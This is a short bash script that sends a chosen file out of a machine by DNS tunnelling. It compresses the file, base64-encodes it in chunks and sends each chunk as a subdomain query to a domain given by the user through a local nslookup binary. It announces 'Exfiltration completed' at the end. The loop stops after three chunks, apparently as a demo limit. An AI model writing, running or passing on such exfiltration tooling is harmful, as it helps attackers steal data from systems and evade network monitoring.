#!/bin/bash

# Function to display usage instructions
usage() {
    echo "Usage: $0 -f <file_path> -d <domain> -s <chunk_size>"
    exit 1
}

# Parse command-line arguments
while getopts "f:d:s:" opt; do
    case "${opt}" in
        f) FILE_PATH=${OPTARG} ;;
        d) DOMAIN=${OPTARG} ;;
        s) CHUNK_SIZE=${OPTARG} ;;
        *) usage ;;
    esac
done

# Ensure required parameters are provided
if [[ -z "$FILE_PATH" || -z "$DOMAIN" || -z "$CHUNK_SIZE" ]]; then
    usage
fi

# Check if file exists
if [[ ! -f "$FILE_PATH" ]]; then
    echo "[-] Error: File '$FILE_PATH' not found."
    exit 1
fi

# Read file and send chunks via DNS
echo "[+] Sending file: $FILE_PATH in chunks of $CHUNK_SIZE bytes to $DOMAIN"

tar -czvf dump.gz $FILE_PATH

counter=0
while IFS= read -r -n "$CHUNK_SIZE" chunk || [[ -n "$chunk" ]]; do
    # Base64 encode the chunk and prepare DNS query
    encoded_chunk=$(echo -n "$chunk" | base64 | tr -d '=' | tr '/+' '_-')
    query="${encoded_chunk}.${DOMAIN}"

    # Perform DNS query
    ./nslookup "$query" > /dev/null 2>&1

    if [[ $? -eq 0 ]]; then
        echo "[+] Sent chunk to: $query"
    else
        echo "[-] Failed to send chunk: $query"
    fi

    ((counter ++))
    if [[ counter -eq 3 ]]
    then
        break
    fi

done < dump.gz

echo "[+] Exfiltration completed."
